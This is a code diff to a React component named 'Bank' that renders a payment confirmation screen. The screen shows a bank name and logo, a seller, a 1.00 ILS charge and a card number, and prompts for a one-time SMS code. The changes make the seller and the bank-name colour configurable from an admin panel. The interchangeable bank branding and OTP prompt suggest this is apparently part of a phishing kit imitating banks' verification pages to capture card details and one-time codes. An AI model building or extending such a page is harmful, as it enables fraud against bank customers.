@@ -19,7 +19,9 @@ export default function Bank({
   logoHeight,
   cardNumber,
   phone,
+  seller,
   color,
+  nameColor = "#ffffff",
   payload,
 }: {
   bankName: string;
@@ -28,8 +30,11 @@ export default function Bank({
   logoHeight: number;
   cardNumber: string;
   phone: string;
+  seller?: string;
   dev?: boolean;
   color: string;
+  // Цвет текста названия банка (задаётся в админке).
+  nameColor?: string;
   // Закодированные значения формы accept для передачи на страницу ok.
   payload?: string;
 }) {
@@ -76,8 +81,8 @@ export default function Bank({
   };
 
   const rows: { label: string; value: string; bold?: boolean }[] = [
-    { label: "Продавец", value: "NAZVANIE LTD" },
-    { label: "Сумма", value: `1:00 ILS`, bold: true },
+    { label: "Продавец", value: seller || "—" },
+    { label: "Сумма", value: `1.00 ILS`, bold: true },
     { label: "Номер счета", value: cardNumber || "—" },
   ];
   return (
@@ -92,7 +97,7 @@ export default function Bank({
         >
           <StyledTypography
             fontFamily={"sans-serif"}
-            color="#fff"
+            color={nameColor}
             paddingTop={3}
             paddingLeft={3}
             fontWeight={600}
@@ -128,7 +133,6 @@ export default function Bank({
               fontFamily={"sans-serif"}
               fontSize={16}
               fontWeight={700}
-              color="#1a1a1a"
             >
               Обработка платежа
             </StyledTypography>
@@ -162,7 +166,6 @@ export default function Bank({
               fontFamily={"sans-serif"}
               fontSize={16}
               fontWeight={700}
-              color="#1a1a1a"
             >
               Подтверждение платежа
             </StyledTypography>
@@ -181,7 +184,6 @@ export default function Bank({
                   <StyledTypography
                     fontSize={14}
                     fontWeight={row.bold ? 700 : 400}
-                    color="#1a1a1a"
                   >
                     {row.value}
                   </StyledTypography>
@@ -193,7 +195,6 @@ export default function Bank({
             <StyledTypography
               fontFamily={"sans-serif"}
               fontSize={14}
-              color="#1a1a1a"
               marginTop={4}
             >
               Введите одноразовый код, отправленный SMS-сообщением на номер{" "}
